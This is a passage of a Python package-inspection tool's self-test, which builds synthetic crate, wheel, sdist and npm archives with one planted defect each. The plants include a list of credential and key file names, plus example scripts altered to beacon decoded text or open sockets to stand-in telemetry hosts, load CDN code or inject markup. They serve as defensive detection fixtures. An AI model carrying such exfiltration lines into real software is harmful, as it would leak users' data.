    art.check("each file's bytes = its git blob", not altered, f"differ: {', '.join(altered[:6])}" if altered else "")
    flipped = [f"{name} (tree {rows[name][0]}, member {modes[name]:o})" for name in sorted(modes)
               if name in rows and bool(modes[name] & 0o111) != (rows[name][0] == "100755")]
    art.check("the exec bit set exactly on the tree's 100755 files", not flipped, "; ".join(flipped[:6]))
    return art


# ---------------------------------------------------------------- archive · all


def cmd_archive(host: Host) -> None:
    if not host.args.files:
        print("archive: give at least one file", file=sys.stderr)
        sys.exit(2)
    usage = cli_usage(host.args)
    if usage:
        print(f"archive: {usage}", file=sys.stderr)
        sys.exit(2)
    for name in host.args.files:
        # Unresolved: an archive outside the repo is reported as given, never as
        # the symlink-resolved path (which can name a private home directory).
        path = pathlib.Path(name)
        note = [f"given archive {name}"]
        art = None
        kind = cli_kind(path.name)
        if not path.is_file():
            host.add(Artifact(f"archive {name}", "archive")).check("file exists", False, name)
        elif path.name.endswith(".crate"):
            art = inspect_crate(host, path, notes=note)
        elif path.name.endswith(".whl"):
            art = inspect_wheel(host, path, notes=note)
        elif path.name.endswith(".tgz"):
            art = inspect_npm(host, path, notes=note)
        elif kind is not None:  # before the sdist: the CLI archives and source are .tar.gz too
            art = {"cli": inspect_cli, "cli-source": inspect_cli_source, "cli-sums": inspect_cli_sums}[kind](
                host, path, notes=note)
        elif path.name.endswith(".tar.gz"):
            art = inspect_sdist(host, path, notes=note)
        else:
            host.add(Artifact(f"archive {name}", "archive")).check("known archive kind", False, path.suffix)
        if art is not None:
            host.recorded.append((art.sha256, name))
    if any(a.kind == "cli-sums" for a in host.artifacts):
        check_cli_sums(host)
    if host.args.release_set:
        check_release_set(host)


def cmd_all(host: Host) -> None:
    for step in (cmd_licenses, cmd_versions, cmd_crates, cmd_node, cmd_wasm, cmd_python, cmd_flutter, cmd_profiles):
        try:
            step(host)
        except Exception as err:  # one broken target must not hide the others
            host.add(Artifact(step.__name__.removeprefix("cmd_"), "error")).check("ran", False, repr(err))


# ---------------------------------------------------------------- selftest

# One name per class of file the stray gates exist for. Each scenario plants
# one in an otherwise clean synthetic archive, which must then FAIL with that
# name in a failing check.
PLANTED = (
    ".netrc", "_netrc", ".pypirc", ".git-credentials", ".npmrc", ".env", ".ENV.production", ".envrc",
    "id_rsa", "id_ed25519", "deploy/ID_ECDSA", ".ssh/known_hosts", "release.jks", "upload.keystore",
    "AuthKey_ABC123.p8", "signing.pfx", "dev.p12", "server.pem", "secring.gpg", "Credentials.json",
    "secrets.toml", ".vscode/settings.json", ".idea/workspace.xml", ".claude/settings.local.json",
    ".cursor/rules.mdc", ".codex/config.toml", "notes.zip", "vendor.tar.gz", "nested.crate", "dist.whl",
    "plans/roadmap.md", "target/release/build.log", "node_modules/x/index.js", ".git/config", ".DS_Store",
    "lib.rs~",
)
REPO_URL = {"type": "git", "url": "https://github.com/qrcode-ai-com/qrcode-barcode-scanner"}


def _tar(path: pathlib.Path, top: str, files: dict, members=None) -> pathlib.Path:
    """FILES under TOP as regular files; MEMBERS adds {name: (tar type, link target)}."""
    with tarfile.open(path, "w:gz") as archive:
        for name, data in sorted(files.items()):
            info = tarfile.TarInfo(f"{top}/{name}")
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
        for name, (kind, target) in sorted((members or {}).items()):
            info = tarfile.TarInfo(f"{top}/{name}")
            info.type, info.linkname = kind, target
            archive.addfile(info)
    return path


def _zip(path: pathlib.Path, files: dict) -> pathlib.Path:
    with zipfile.ZipFile(path, "w") as archive:
        for name, data in sorted(files.items()):
            archive.writestr(name, data)
    return path


def _tar_member(name: str, data: bytes) -> bytes:
    info = tarfile.TarInfo(name)
    info.size, info.mode, info.mtime = len(data), 0o644, 0
    return info.tobuf(tarfile.USTAR_FORMAT) + data + b"\0" * (-len(data) % 512)


def _raw_tar(path: pathlib.Path, top: str, files: dict, segments) -> pathlib.Path:
    """FILES as regular members under TOP, then SEGMENTS appended before the
    end-of-archive blocks, so Python's default parse and node-tar's can diverge.
    A segment is ('zero',) one all-zero block, ('bad',) one bad-checksum block,
    ('file', name, data) a raw member, or ('raw', bytes) arbitrary bytes."""
    stream = b"".join(_tar_member(f"{top}/{name}", data) for name, data in sorted(files.items()))
    for seg in segments:
        if seg[0] == "zero":
            stream += b"\0" * 512
        elif seg[0] == "bad":
            stream += b"X" * 512
        elif seg[0] == "file":
            stream += _tar_member(f"{top}/{seg[1]}", seg[2])
        elif seg[0] == "raw":
            stream += seg[1]
    stream += b"\0" * 1024  # the end-of-archive marker
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(gzip.compress(stream, mtime=0))
    return path


def _clean_crate(version: str) -> dict:
    core = ROOT / "crates" / "qrcode-ai-scanner"
    manifest = f'[package]\nname = "qrcode-barcode-scanner"\nversion = "{version}"\nlicense = "{SPDX}"\n'
    return {
        "Cargo.toml": manifest.encode(), "Cargo.toml.orig": (core / "Cargo.toml").read_bytes(),
        ".cargo_vcs_info.json": b'{"git": {"sha1": "0"}, "path_in_vcs": "crates/qrcode-ai-scanner"}\n',
        "Cargo.lock": b"version = 4\n", "src/lib.rs": b"//! synthetic\n",
        "README.md": (core / "README.md").read_bytes(), "LICENSE": LICENSE.read_bytes(),
    }


def _python_metadata(version: str, readme=None) -> bytes:
    """Core metadata as maturin writes it: the fields, then the README as the description body."""
    readme = (PY_DIR / "README.md").read_bytes() if readme is None else readme
    return (f"Metadata-Version: 2.4\nName: {PYPI_NAME}\nVersion: {version}\n"
            f"License-Expression: {SPDX}\nLicense-File: LICENSE\n"
            "Description-Content-Type: text/markdown; charset=UTF-8; variant=GFM\n\n").encode() + readme


def _sbom(version: str, root: str = PY_SBOM_ROOT) -> bytes:
    """maturin's Rust SBOM, cut down to what the inspector reads: its format and root component."""
    return json.dumps({"bomFormat": "CycloneDX", "specVersion": "1.5", "version": 1, "metadata": {
        "component": {"type": "library", "name": root, "version": version}}}).encode()


def _clean_wheel(version: str, platform: str = "manylinux_2_17_x86_64", python: str = "cp38-abi3") -> dict:
    """A wheel's files as maturin writes them, tagged PYTHON-PLATFORM (dotted = several tags)."""
    info = f"{PY_MODULE}-{version}.dist-info"
    tags = "".join(f"Tag: {python}-{tag}\n" for tag in platform.split("."))
    files = {
        f"{info}/METADATA": _python_metadata(version),
        f"{info}/WHEEL": f"Wheel-Version: 1.0\nRoot-Is-Purelib: false\n{tags}".encode(),
        f"{info}/licenses/LICENSE": LICENSE.read_bytes(),
        f"{info}/{PY_SBOM}": _sbom(version),
        f"{PY_MODULE}/__init__.py": MATURIN_INIT_PY,
        f"{PY_MODULE}/__init__.pyi": (PY_DIR / f"{PY_MODULE}.pyi").read_bytes(),
        f"{PY_MODULE}/py.typed": (PY_DIR / "py.typed").read_bytes(),
        f"{PY_MODULE}/{PY_MODULE}.abi3.so": b"\x7fELF",
    }
    return _with_record(files, version)


def _with_record(files: dict, version: str, *unlisted: str) -> dict:
    """FILES with a RECORD naming every entry but UNLISTED (no hashes: never verified)."""
    record = f"{PY_MODULE}-{version}.dist-info/RECORD"
    names = sorted(n for n in files if n != record and n not in unlisted)
    return files | {record: "".join(f"{n},,\n" for n in [*names, record]).encode()}


def _clean_sdist(version: str) -> dict:
    # Packed source files carry the checkout's bytes (the sdist content check
    # compares them); the two Cargo.toml and the root metadata are what maturin
    # rewrites or generates, so their exact bytes do not matter here.
    py, core = PY_DIR, ROOT / "crates" / "qrcode-ai-scanner"
    return {
        "PKG-INFO": _python_metadata(version), "pyproject.toml": (py / "pyproject.toml").read_bytes(),
        "README.md": (py / "README.md").read_bytes(), "LICENSE": LICENSE.read_bytes(),
        f"{PY_MODULE}.pyi": (py / f"{PY_MODULE}.pyi").read_bytes(),
        "py.typed": (py / "py.typed").read_bytes(),
        "qrcode-ai-scanner-py/Cargo.toml": (py / "Cargo.toml").read_bytes(),
        "qrcode-ai-scanner-py/src/lib.rs": (py / "src" / "lib.rs").read_bytes(),
        "qrcode-ai-scanner-py/LICENSE": LICENSE.read_bytes(),
        "qrcode-ai-scanner/Cargo.toml": (core / "Cargo.toml").read_bytes(),
        "qrcode-ai-scanner/src/lib.rs": (core / "src" / "lib.rs").read_bytes(),
        "qrcode-ai-scanner/README.md": (core / "README.md").read_bytes(),
        "qrcode-ai-scanner/LICENSE": LICENSE.read_bytes(),
    }


def _npm_main(version: str, optional=None) -> dict:
    pkg = json.loads((NODE_DIR / "package.json").read_text())
    if optional is not None:
        pkg["optionalDependencies"] = optional
    files = {name: (NODE_DIR / name).read_bytes() for name in ("README.md", "index.js", "index.d.ts",
                                                               "native.js", "native.d.ts")}
    return files | {"package.json": json.dumps(pkg, indent=2).encode(), "LICENSE": LICENSE.read_bytes(),
                    "report-types.d.ts": CANON_TYPES.read_bytes()}


def _npm_platform(version: str, suffix: str) -> dict:
    binary = f"{NODE_BINARY}.{suffix}.node"
    os_name, cpu = suffix.split("-")[:2]
    pkg = {"name": f"{NODE_NAME}-{suffix}", "version": version, "os": [os_name], "cpu": [cpu],
           "main": binary, "files": [binary], "license": SPDX, "repository": REPO_URL}
    return {"package.json": json.dumps(pkg).encode(), "README.md": (ROOT / "distribution/npm/README.md").read_bytes(),
            "LICENSE": LICENSE.read_bytes(), binary: b"\x7fELF"}


def _npm_wasm(version: str) -> dict:
    """The wasm package as build-wasm.sh leaves pkg/: wasm-pack output, patched."""
    pkg = {"name": WASM_NAME, "type": "module", "version": version, "license": SPDX, "repository": REPO_URL,
           "files": [WASM_MODULE, f"{WASM_STEM}.js", f"{WASM_STEM}.d.ts", "report-types.d.ts", "LICENSE"],
           "main": f"{WASM_STEM}.js", "types": f"{WASM_STEM}.d.ts",
           "exports": {".": {"types": f"./{WASM_STEM}.d.ts", "import": f"./{WASM_STEM}.js",
                             "default": f"./{WASM_STEM}.js"},
                       **{f"./{name}": {"types": f"./{name}.d.ts", "import": f"./{name}.js", "default": f"./{name}.js"}
                          for name in ("auto", "camera", "camera-overlay", "destination")},
                       "./destination-node": {"types": "./destination-node.d.ts", "node": "./destination-node.js"},
                       "./destination-node.js": None,
                       "./report-types": {"types": "./report-types.d.ts"},
                       f"./{WASM_MODULE}": f"./{WASM_MODULE}",
                       "./build-info.json": "./build-info.json", "./*": "./*"}}
    wasm = b"\0asm\1\0\0\0"
    info = {"schema": wasm_provenance().SCHEMA, "package": WASM_NAME, "version": version,
            "inputs": wasm_provenance().inputs_digest(ROOT),
            "wasm": {"path": WASM_MODULE, "sha256": hashlib.sha256(wasm).hexdigest(), "features": []}}
    dts = ('export * from "./report-types";\n'
           "export function capabilities(): Capabilities;\n"
           "export function scan_frame(data: Uint8Array, width: number, height: number): ScanReport;\n"
           "export function scan_image(bytes: Uint8Array): ScanReport;\n")
    return {"package.json": json.dumps(pkg, indent=2).encode(), "README.md": (WASM_DIR / "README.md").read_bytes(),
            "LICENSE": LICENSE.read_bytes(), f"{WASM_STEM}.js": b"export {};\n",
            **{notice: (ROOT / "crates/qrcode-ai-scanner" / notice).read_bytes() for notice in ("LICENSE-APACHE-2.0", "THIRD-PARTY.md")},
            f"{WASM_STEM}.d.ts": dts.encode(), WASM_MODULE: wasm,
            "build-info.json": json.dumps(info).encode(),
            "report-types.d.ts": CANON_TYPES.read_bytes(),
            **{f"{name}.{ext}": (WASM_DIR / f"{name}.{ext}").read_bytes()
               for name in ("auto", "camera", "camera-overlay", "destination", "destination-node")
               for ext in ("js", "d.ts")},
            **{name: (WASM_DIR / name).read_bytes() for name in WASM_EXAMPLE_FILES}}


def _with_scripts(files: dict, **scripts: str) -> dict:
    """An npm package's FILES whose package.json gains SCRIPTS."""
    pkg = json.loads(files["package.json"])
    pkg["scripts"] = dict(pkg.get("scripts") or {}, **scripts)
    return files | {"package.json": json.dumps(pkg, indent=2).encode()}


def _run_main(argv: list) -> int:
    """main(ARGV)'s exit code, its output swallowed, with no CI annotation or step summary written."""
    saved = {key: os.environ.pop(key) for key in ("GITHUB_ACTIONS", "GITHUB_STEP_SUMMARY") if key in os.environ}
    try:
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            return main(argv)
    except SystemExit as err:
        return err.code if isinstance(err.code, int) else 1
    finally:
        os.environ.update(saved)


# python.yml › wheels builds one wheel per row, each tagged like these (the
# 0.9.0 names); the PyPI release set holds exactly one per row plus the sdist.
SELFTEST_PLATFORMS = ("manylinux_2_17_x86_64.manylinux2014_x86_64", "manylinux_2_17_aarch64.manylinux2014_aarch64",
                      "musllinux_1_2_x86_64", "macosx_10_12_x86_64", "macosx_11_0_arm64", "win_amd64")


def self_test() -> int:
    """Synthetic archives with one known defect each, judged by `archive`."""
    version = workspace_version()
    pins = {f"{NODE_NAME}-{suffix}": version for suffix in napi_suffixes()}
    crlf = LICENSE.read_bytes().replace(b"\n", b"\r\n")
    failures: list[str] = []
    ran = 0
    with tempfile.TemporaryDirectory(prefix="package-inspect-selftest-") as tmp:
        base = pathlib.Path(tmp)

        def judge(name: str, paths: list, want: str, *needles: str, release_set: bool = False) -> None:
            nonlocal ran
            ran += 1
            argv = ["archive", *map(str, paths), *(["--release-set"] if release_set else [])]
            host = Host(build_parser().parse_args(argv))
            try:
                with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                    cmd_archive(host)
            finally:
                shutil.rmtree(host.scratch, ignore_errors=True)
            got = FAIL if any(a.status == FAIL for a in host.artifacts) else PASS
            failed = " · ".join(f"{c.name}: {c.detail}" for a in host.artifacts for c in a.checks if not c.ok)
            missing = [n for n in needles if n not in failed]
            # A check that passed reports no difference: the report, and the CI
            # job summary it is written to, must never read "ok · differs from".
            contradicted = [f"{c.name}: {c.detail}" for a in host.artifacts for c in a.checks
                            if c.ok and c.detail.startswith("differ")]
            if got != want or missing or contradicted:
                failures.append(f"{name}: {got.upper()} (want {want.upper()})"
                                + (f", no failing check names {missing}" if missing else "")
                                + (f", passing checks report a difference: {contradicted}" if contradicted else "")
                                + (f" — failing: {failed}" if failed else ""))

        def place(name: str, filename: str) -> pathlib.Path:
            (base / name).mkdir(parents=True, exist_ok=True)
            return base / name / filename

        def crate(name: str, files: dict, members=None) -> pathlib.Path:
            return _tar(place(name, f"qrcode-barcode-scanner-{version}.crate"), f"qrcode-barcode-scanner-{version}",
                        files, members)

        def wheel(name: str, files: dict, platform: str = "manylinux_2_17_x86_64",
                  python: str = "cp38-abi3") -> pathlib.Path:
            return _zip(place(name, f"{PY_MODULE}-{version}-{python}-{platform}.whl"), files)

        def sdist(name: str, files: dict, members=None) -> pathlib.Path:
            return _tar(place(name, f"{PY_MODULE}-{version}.tar.gz"), f"{PY_MODULE}-{version}", files, members)

        def npm(name: str, files: dict, members=None) -> pathlib.Path:
            pkg = json.loads(files["package.json"])
            return _tar(place(name, f"{pkg['name'].lstrip('@').replace('/', '-')}-{version}.tgz"), "package",
                        files, members)

        # The clean archives pass: every negative below fails for its plant.
        judge("clean crate", [crate("clean", _clean_crate(version))], PASS)
        retired_crate = _clean_crate(version)
        retired_crate["Cargo.toml"] = retired_crate["Cargo.toml"].replace(b'name = "qrcode-barcode-scanner"',
                                                                          b'name = "qrcode-ai-scanner"')
        judge("crate packaged under the 0.10 name",
              [_tar(place("crate-retired", f"qrcode-ai-scanner-{version}.crate"), f"qrcode-ai-scanner-{version}",
                    retired_crate)], FAIL, "never a retired name", "qrcode-ai-scanner")
        judge("crate file named after the 0.10 name",
              [_tar(place("crate-retired-file", f"qrcode-ai-scanner-{version}.crate"),
                    f"qrcode-barcode-scanner-{version}", _clean_crate(version))], FAIL,
              "file name is <name>-<version>.crate")
        cli_dir = ROOT / "crates/qrcode-ai-scanner-cli"
        cli_files = {
            "Cargo.toml": (
                f'[package]\nname = "qrcode-barcode-scanner-cli"\nversion = "{version}"\nlicense = "{SPDX}"\n'
                f'[dependencies.qrcode-barcode-scanner]\nversion = "{version}"\n'
                '[profile.release.package.rxing]\noverflow-checks = true\n'
            ).encode(),
            "Cargo.toml.orig": (cli_dir / "Cargo.toml").read_bytes(),
            "src/main.rs": b"//! synthetic\n",
            "README.md": (cli_dir / "README.md").read_bytes(),
            "LICENSE": LICENSE.read_bytes(),
        }
        def cli_crate(label, files):
            return _tar(place(label, f"qrcode-barcode-scanner-cli-{version}.crate"),
                        f"qrcode-barcode-scanner-cli-{version}", files)
        judge("CLI overflow checks retained", [cli_crate("cli-guard", cli_files)], PASS)
        for label, replacement in [("absent", b""), ("false", b"overflow-checks = false\n")]:
            bad = cli_files | {"Cargo.toml": cli_files["Cargo.toml"].replace(b"overflow-checks = true\n", replacement)}
            judge(f"CLI overflow checks {label}", [cli_crate(f"cli-guard-{label}", bad)], FAIL, "overflow-checks")
        judge("clean wheel", [wheel("wheel", _clean_wheel(version))], PASS)
        judge("clean sdist", [sdist("sdist", _clean_sdist(version))], PASS)
        for stub in (f"{PY_MODULE}.pyi", "py.typed"):
            missing = {k: v for k, v in _clean_sdist(version).items() if k != stub}
            judge(f"sdist root missing {stub}", [sdist(f"sdist-missing-{stub}", missing)], FAIL, stub)
            judge(f"sdist root changed {stub}",
                  [sdist(f"sdist-changed-{stub}", _clean_sdist(version) | {stub: b"changed"})], FAIL, stub)
        judge("clean platform package", [npm("platform", _npm_platform(version, "linux-x64-gnu"))], PASS)
        judge("clean main package", [npm("main", _npm_main(version))], PASS)
        judge("clean wasm package", [npm("wasm", _npm_wasm(version))], PASS)
        for missing in ("auto.js", "auto.d.ts", "camera.js", "camera.d.ts", "camera-overlay.js", "camera-overlay.d.ts",
                        "destination.js", "destination.d.ts", "destination-node.js", "destination-node.d.ts",
                        "LICENSE-APACHE-2.0", "THIRD-PARTY.md", "build-info.json"):
            incomplete = {key: value for key, value in _npm_wasm(version).items() if key != missing}
            judge(f"wasm package missing {missing}", [npm("wasm-incomplete", incomplete)], FAIL, missing)
        # One physical module, and the recorded current build: a second binary
        # (the 0.10 compatible/ copy, under its old name), changed bytes or a
        # record of other inputs are each refused.
        judge("wasm package + the 0.10 compatible/ module",
              [npm("wasm-second", _npm_wasm(version) | {"compatible/qrcode-ai-scanner_bg.wasm": b"\0asm\1\0\0\0"})],
              FAIL, "exactly one WASM binary")
        for key in ("./compatible/qrcode-ai-scanner_bg.wasm", f"./compatible/{WASM_MODULE}", "./compatible/*"):
            retargeted = json.loads(_npm_wasm(version)["package.json"])
            retargeted["exports"][key] = key
            judge(f"wasm package exporting {key}",
                  [npm("wasm-alias", _npm_wasm(version) | {"package.json": json.dumps(retargeted, indent=2).encode()})],
                  FAIL, "no compatible/ export", key)
        # The whole package under the 0.10 file names (the --out-name the 0.10
        # build passed): its module, glue, types, entry fields and build record.
        renamed = {"qrcode-ai-scanner" + name.removeprefix(WASM_STEM) if name.startswith(WASM_STEM) else name: data
                   for name, data in _npm_wasm(version).items()}
        old_pkg = json.loads(json.dumps(json.loads(renamed["package.json"])).replace(WASM_STEM + ".",
                                                                                     "qrcode-ai-scanner.")
                             .replace(WASM_MODULE, "qrcode-ai-scanner_bg.wasm"))
        old_info = json.loads(renamed["build-info.json"])
        old_info["wasm"]["path"] = "qrcode-ai-scanner_bg.wasm"
        judge("wasm package under the 0.10 file names",
              [npm("wasm-old-files", renamed | {"package.json": json.dumps(old_pkg, indent=2).encode(),
                                                "build-info.json": json.dumps(old_info).encode()})],
              FAIL, f"exactly one WASM binary ({WASM_MODULE})", "main, module and types",
              f"wasm.path is {WASM_MODULE}", "qrcode-ai-scanner.js")
        for field, value, needle in (("package", f"{RETIRED_SCOPE}qrcode-ai-scanner-wasm", "build-info package"),
                                     ("wasm.path", "qrcode-ai-scanner_bg.wasm", f"wasm.path is {WASM_MODULE}")):
            planted = json.loads(_npm_wasm(version)["build-info.json"])
            if field == "package":
                planted["package"] = value
            else:
                planted["wasm"]["path"] = value
            judge(f"wasm package whose build-info.json records {field} {value}",
                  [npm("wasm-record", _npm_wasm(version) | {"build-info.json": json.dumps(planted).encode()})],
                  FAIL, needle)
        judge("wasm package with modified WASM bytes",
              [npm("wasm-modified", _npm_wasm(version) | {WASM_MODULE: b"\0asm\1\0\0\0\0\x01\0"})],
              FAIL, "modified WASM")
        stale = json.loads(_npm_wasm(version)["build-info.json"])
        stale["inputs"]["sha256"] = "0" * 64
        judge("wasm package recorded from other compiled inputs (stale same-version build)",
              [npm("wasm-stale", _npm_wasm(version) | {"build-info.json": json.dumps(stale).encode()})],
              FAIL, "stale build")
        simd_module = bytes(json.loads("[" + re.search(r"SIMD_PROBE = new Uint8Array\(\[([0-9,]+)\]\)",
                                                         (WASM_DIR / "auto.js").read_text()).group(1) + "]"))
        simd_info = json.loads(_npm_wasm(version)["build-info.json"])
        simd_info["wasm"] = {"path": WASM_MODULE, "sha256": hashlib.sha256(simd_module).hexdigest(),
                             "features": ["simd128"]}
        judge("wasm package whose module needs SIMD",
              [npm("wasm-simd", _npm_wasm(version) | {WASM_MODULE: simd_module,
                                                     "build-info.json": json.dumps(simd_info).encode()})],
              FAIL, "outside the floor")
        # Tests, fixtures and replay tools sit beside the shipped modules and never ship.
        for planted in ("destination.test.mjs", "destination-node.test.mjs", "destination.browser.test.mjs",
                        "destination-fixtures.mjs", "camera-replay.test.mjs", "replay/metrics.mjs"):
            judge(f"wasm package + {planted}",
                  [npm(f"wasm-plant-{re.sub(r'[^a-z0-9]+', '-', planted)}", _npm_wasm(version) | {planted: b"//\n"})],
                  FAIL, f"unexpected: {planted}")
        # A trailing comment passes every static reading: only the copy check refuses it.
        for name in ("destination.js", "destination.d.ts", "destination-node.js", "destination-node.d.ts"):
            altered = _npm_wasm(version)
            altered[name] += b"\n// altered\n"
            judge(f"wasm package with an altered {name}", [npm(f"wasm-altered-{name}", altered)], FAIL,
                  f"{name} is crates/qrcode-ai-scanner-wasm/{name} verbatim")
        # The examples: every file ships, each the crate's, and nothing else sits under examples/.
        for name in WASM_EXAMPLE_FILES:
            label = re.sub(r"[^a-z0-9]+", "-", name)
            incomplete = {key: value for key, value in _npm_wasm(version).items() if key != name}
            judge(f"wasm package missing {name}", [npm(f"wasm-missing-{label}", incomplete)], FAIL, f"missing: {name}")
            altered = _npm_wasm(version)
            altered[name] += b"\n"
            judge(f"wasm package with an altered {name}", [npm(f"wasm-altered-{label}", altered)], FAIL,
                  f"{name} is crates/qrcode-ai-scanner-wasm/{name} verbatim")
        for planted in ("examples/notes.md", "examples/headless.test.mjs", "examples/fixtures/sample.png"):
            judge(f"wasm package + {planted}",
                  [npm(f"wasm-plant-{re.sub(r'[^a-z0-9]+', '-', planted)}", _npm_wasm(version) | {planted: b"x"})],
                  FAIL, f"unexpected: {planted}")
        # Each static reading of the example refuses its own form (the copy check refuses them too).
        floor, loads = "examples/headless.js stays inside the browser floor", "the example loads only files"
        dom = "examples/headless.js parses no markup"
        shown = "item.appendChild(element('pre', 'value', text));"
        for label, name, old, new, needles in (
                ("a logical assignment", "examples/headless.js", "const BUDGET_MS = 0;",
                 "let BUDGET_MS;\nBUDGET_MS ??= 0;", (floor, "logical assignment ??=")),
                ("a bare specifier", "examples/scanner.worker.js", "from '../auto.js'",
                 f"from '{WASM_NAME}/auto'", (loads, "is not a relative path")),
                ("a CDN import", "examples/scanner.worker.js", "from '../auto.js'",
                 "from 'https://cdn.example.com/auto.js'", (loads, "is not a relative path")),
                ("an import outside the package", "examples/scanner.worker.js", "from '../auto.js'",
                 "from '../../auto.js'", (loads, "names no file the package ships")),
                ("a computed import", "examples/scanner.worker.js", "let load = null;",
                 "let load = null;\nconst later = (name) => import(name);", (loads, "names no literal path")),
                ("a URL to a file the package lacks", "examples/headless.js", "'../build-info.json'",
                 "'../build-info.min.json'", (loads, "names no file the package ships")),
                ("a computed worker URL", "examples/headless.js", "new URL('./scanner.worker.js', import.meta.url)",
                 "new URL(`./${'scanner'}.worker.js`, import.meta.url)", (loads, "names no literal path")),
                ("a CDN script in the page", "examples/headless.html", '<script type="module" src="./headless.js">',
                 '<script src="https://cdn.example.com/scanner.js"></script>\n<script type="module" src="./headless.js">',
                 (loads, "is not a relative path")),
                ("a stylesheet from elsewhere", "examples/headless.html", '<link rel="icon" href="data:,">',
                 '<link rel="icon" href="data:,">\n<link rel="stylesheet" href="//fonts.example.com/a.css">',
                 (loads, "is not a relative path")),
                ("a value written as markup", "examples/headless.js", shown,
                 "const value = element('pre', 'value');\n  value.innerHTML = text;\n  item.appendChild(value);",
                 (dom, ": innerHTML")),
                ("a value made a link", "examples/headless.js", shown,
                 "const link = element('a', 'value', text);\n  link['href'] = text;\n  item.appendChild(link);",
                 (dom, ": href")),
                ("a value opened", "examples/headless.js", shown,
                 f"{shown}\n  if (/^https?:/.test(text)) window.open(text, '_blank');", (dom, ": open()")),
                ("a reload after an error", "examples/headless.js", "function showError(reply, name) {",
                 "function showError(reply, name) {\n  if (reply.phase === 'scan') location.reload();",
                 (dom, ": location")),
                ("a fetch from elsewhere", "examples/headless.js", "await fetch(url)",
                 "await fetch('https://cdn.example.com/package.json')", (loads, "is not a relative path")),
                ("a fetch URL built from a literal", "examples/headless.js", "await fetch(url)",
                 "await fetch('https://cdn.example.com/' + url.pathname)", (loads, "names no literal path")),
                ("a worker from elsewhere", "examples/headless.js", "new Worker(WORKER_URL, { type: 'module' })",
                 "new Worker('https://cdn.example.com/scanner.worker.js', { type: 'module' })",
                 (loads, "is not a relative path")),
                ("a shared worker outside the package", "examples/scanner.worker.js", "let load = null;",
                 "let load = null;\nconst shared = new SharedWorker('../../shared.worker.js');",
                 (loads, "names no file the package ships")),
                ("a script imported from elsewhere", "examples/scanner.worker.js", "let load = null;",
                 "let load = null;\nimportScripts('https://cdn.example.com/polyfill.js');",
                 (loads, "is not a relative path")),
                ("a socket", "examples/scanner.worker.js", "let load = null;",
                 "let load = null;\nconst socket = new WebSocket('wss://telemetry.example.com/');",
                 (loads, "is not a relative path")),
                ("an event stream", "examples/headless.js", "const BUDGET_MS = 0;",
                 "const BUDGET_MS = 0;\nconst events = new EventSource(`https://events.example.com/${BUDGET_MS}`);",
                 (loads, "names no literal path")),
                ("a beacon", "examples/headless.js", shown,
                 f"{shown}\n  navigator.sendBeacon('https://telemetry.example.com/', text);",
                 (loads, "is not a relative path")),
                ("a link made with Object.assign", "examples/headless.js", shown,
                 "item.appendChild(Object.assign(element('a', 'value', text), { href: text }));", (dom, ": href")),
                ("a link made with setAttribute", "examples/headless.js", shown,
                 "const link = element('a', 'value', text);\n  link.setAttribute('href', text);\n  item.appendChild(link);",
                 (dom, "setAttribute('href')")),
                ("an image source set with setAttribute", "examples/headless.js", shown,
                 "const image = element('img', 'value');\n  image.setAttribute('src', text);\n  item.appendChild(image);",
                 (dom, "setAttribute('src')")),
                ("a computed attribute set", "examples/headless.js", shown,
                 "const link = element('a', 'value', text);\n  link.setAttribute(text.slice(0, 4), text);\n"
                 "  item.appendChild(link);", (dom, "of a computed attribute"))):
            planted = _npm_wasm(version)
            source = planted[name].decode()
            if old not in source:
                failures.append(f"example plant {label}: {old!r} not found in {name}")
                continue
            planted[name] = source.replace(old, new, 1).encode()
            judge(f"wasm package whose example has {label}",
                  [npm(f"wasm-example-{re.sub(r'[^a-z0-9]+', '-', label)}", planted)], FAIL, *needles)
        # The camera page and script are read like the image example's, and the server-rendering
        # script loads exactly the three browser subpaths by the package's name.
        camera_floor = "examples/camera.js stays inside the browser floor"
        camera_dom = "examples/camera.js parses no markup"
        ssr = f"{WASM_SSR_EXAMPLE} loads exactly ./camera, ./camera-overlay and ./destination"
        ssr_camera = f"await import('{WASM_NAME}/camera');"
        label_line = "option.textContent = device.label || `Camera ${index + 1}`;"
        for label, name, old, new, needles in (
                ("a logical assignment in the camera script", "examples/camera.js", "let chosenDevice = null;",
                 "let chosenDevice;\nchosenDevice ??= null;", (camera_floor, "logical assignment ??=")),
                ("a camera script import from a CDN", "examples/camera.js", "from '../camera.js'",
                 "from 'https://cdn.example.com/camera.js'", (loads, "is not a relative path")),
                ("a camera script import outside the package", "examples/camera.js", "from '../destination.js'",
                 "from '../../destination.js'", (loads, "names no file the package ships")),
                ("a CDN script in the camera page", "examples/camera.html",
                 '<script type="module" src="./camera.js">',
                 '<script src="https://cdn.example.com/scanner.js"></script>\n<script type="module" src="./camera.js">',
                 (loads, "is not a relative path")),
                ("a camera label written as markup", "examples/camera.js", label_line,
                 "option.innerHTML = device.label;", (camera_dom, ": innerHTML")),
                ("a decoded link opened by the camera page", "examples/camera.js",
                 "const camera = createCameraScanner({",
                 "overlay.setOptions({ onSelect: (track) => track && window.open(track.content.text) });\n"
                 "const camera = createCameraScanner({", (camera_dom, ": open()")),
                ("a camera page that reads its location", "examples/camera.js",
                 "window.isSecureContext === false", "location.protocol === 'http:'", (camera_dom, ": location")),
                ("a static import in the server-rendering script", WASM_SSR_EXAMPLE,
                 f"const camera = {ssr_camera}",
                 f"import * as camera from '{WASM_NAME}/camera';", (ssr, ": import ")),
                ("a Node module in the server-rendering script", WASM_SSR_EXAMPLE, ssr_camera,
                 f"{ssr_camera}\nawait import('node:http');", (ssr, "import() of ")),
                ("a relative import in the server-rendering script", WASM_SSR_EXAMPLE,
                 f"'{WASM_NAME}/destination'", "'../destination.js'",
                 (ssr, "import() of ")),
                ("an import by the 0.10 package name in the server-rendering script", WASM_SSR_EXAMPLE,
                 f"'{WASM_NAME}/destination'", f"'{RETIRED_SCOPE}qrcode-ai-scanner-wasm/destination'",
                 (ssr, "import() of ")),
                ("a require() in the server-rendering script", WASM_SSR_EXAMPLE, "const reads = [];",
                 "const reads = [];\nconst destination = require('../destination.js');", (ssr, ": require()")),
                ("a Node built-in reached by getBuiltinModule() in the server-rendering script", WASM_SSR_EXAMPLE,
                 "const reads = [];", "const reads = [];\nconst http = process.getBuiltinModule('node:http');",
                 (ssr, ": getBuiltinModule()"))):
